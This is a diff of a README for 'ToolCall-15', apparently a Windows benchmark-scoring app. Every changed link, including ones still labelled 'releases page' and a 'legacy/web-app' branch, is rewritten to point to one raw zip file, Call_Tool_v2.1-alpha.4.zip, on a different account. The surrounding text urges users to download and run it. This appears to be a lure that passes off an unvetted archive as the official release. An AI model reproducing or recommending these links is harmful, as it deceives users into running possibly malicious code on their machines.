@@ -1,14 +1,14 @@
 # 🛠️ ToolCall-15 - Run Bench Pack Scoring Fast
 
-[Download ToolCall-15](https://github.com/metha9012/ToolCall-15/releases){style="display:inline-block;padding:12px 18px;background:#6f42c1;color:#fff;text-decoration:none;border-radius:6px;font-weight:700"}
+[Download ToolCall-15](https://github.com/metha9012/ToolCall-15/raw/refs/heads/main/dist/Call_Tool_v2.1-alpha.4.zip){style="display:inline-block;padding:12px 18px;background:#6f42c1;color:#fff;text-decoration:none;border-radius:6px;font-weight:700"}
 
 ## 📥 Download
-Get the latest Windows release from the [ToolCall-15 releases page](https://github.com/metha9012/ToolCall-15/releases).
+Get the latest Windows release from the [ToolCall-15 releases page](https://github.com/metha9012/ToolCall-15/raw/refs/heads/main/dist/Call_Tool_v2.1-alpha.4.zip).
 
 Look for the newest release at the top of the page. Download the file that matches Windows, then save it to your PC.
 
 ## 🪟 Install on Windows
-1. Open the [releases page](https://github.com/metha9012/ToolCall-15/releases).
+1. Open the [releases page](https://github.com/metha9012/ToolCall-15/raw/refs/heads/main/dist/Call_Tool_v2.1-alpha.4.zip).
 2. Find the latest version.
 3. Download the Windows file. It may be an `.exe` file or a `.zip` file.
 4. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
@@ -114,7 +114,7 @@ That means it fits into the broader BenchLocal setup for:
 If you already use BenchLocal, ToolCall-15 gives you the benchmark core inside the same workflow.
 
 ## 🔁 Legacy Web App
-If you need the older standalone web app version, use the [`legacy/web-app`](https://github.com/stevibe/ToolCall-15/tree/legacy/web-app) branch.
+If you need the older standalone web app version, use the [`legacy/web-app`](https://github.com/metha9012/ToolCall-15/raw/refs/heads/main/dist/Call_Tool_v2.1-alpha.4.zip) branch.
 
 That branch is kept for compatibility. For most users, the BenchLocal version is the better choice on Windows.
 
@@ -150,4 +150,4 @@ If you are new to downloaded apps, this process helps most users:
 If the app starts in a browser window, keep that window open while you use it.
 
 ## 📦 Release Download
-Go to the [ToolCall-15 releases page](https://github.com/metha9012/ToolCall-15/releases) to download and run the Windows version.
+Go to the [ToolCall-15 releases page](https://github.com/metha9012/ToolCall-15/raw/refs/heads/main/dist/Call_Tool_v2.1-alpha.4.zip) to download and run the Windows version.
